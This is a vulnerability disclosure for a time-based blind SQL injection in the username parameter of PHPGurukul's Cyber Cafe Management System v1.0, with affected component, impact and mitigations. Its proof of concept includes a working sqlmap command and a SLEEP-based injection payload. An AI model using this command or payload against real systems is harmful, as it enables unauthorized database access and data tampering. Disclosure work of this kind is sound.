# CVE-2025-70892 â€“ SQL Injection Vulnerability

## ğŸ“Œ Description
Cyber Cafe Management System v1.0 contains a SQL Injection vulnerability
in the `add-users.php` endpoint. The application fails to properly
sanitize user-supplied input provided via the `username` parameter.
As a result, attacker-controlled input is directly incorporated into
backend SQL queries without adequate sanitization or parameterization.

## ğŸ§± Affected Product
- Product: Cyber Cafe Management System
- Vendor: PHPGurukul
- Version: v1.0

## ğŸ“‚ Affected Component
- File: `add-users.php`
- Parameter: `username`
- Request Method: POST

## ğŸ¯ Attack Vector
An authenticated attacker with administrative privileges can exploit
this vulnerability by submitting crafted input via the `username`
parameter during the user creation process. Default administrative
credentials are provided with the application installation.

## ğŸ” Vulnerability Type
SQL Injection (Time-Based Blind)

## âš ï¸ Impact
- Information disclosure
- Unauthorized database access
- Data manipulation

## ğŸ§ª Proof of Concept
The vulnerability was validated using a time-based SQL injection
technique. By injecting SQL expressions that introduce intentional
response delays (e.g., using database sleep functions), it was possible
to confirm that attacker-controlled input was executed as part of the
SQL query.

The delayed responses consistently confirmed the presence of a
time-based blind SQL Injection vulnerability affecting the `username`
parameter.

```bash
sqlmap -u "http://<TARGET-IP>/ccms/add-users.php" \
--data="username=TEST&uadd=TEST&mobilenumber=REDACTED&email=REDACTED@example.com&cname=REDACTED&idproof=REDACTED&submit=" \
-p username \
--cookie="PHPSESSID=<SESSION_ID>" \
--technique=T \
--time-sec=5 \
--risk=3 \
--level=5 \
--dbs \
--batch
```

```bash
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=TEST' AND (SELECT 1234 FROM (SELECT(SLEEP(5)))abc) AND 'a'='a
---
```

![Time-Based SQL Injection PoC](/images/timebased-sqli.png)


## Mitigation
- Implement prepared statements (parameterized queries)
- Apply strict server-side input validation
- Sanitize and encode all user-supplied input
- Use least-privilege database accounts
- Remove or change default administrative credentials after installation

## ğŸ”— References
- https://phpgurukul.com/cyber-cafe-management-system-using-php-mysql/
- https://phpgurukul.com/?sdm_process_download=1&download_id=21779

## ğŸ‘¤ Discoverer
Efe Kaan AKKAR
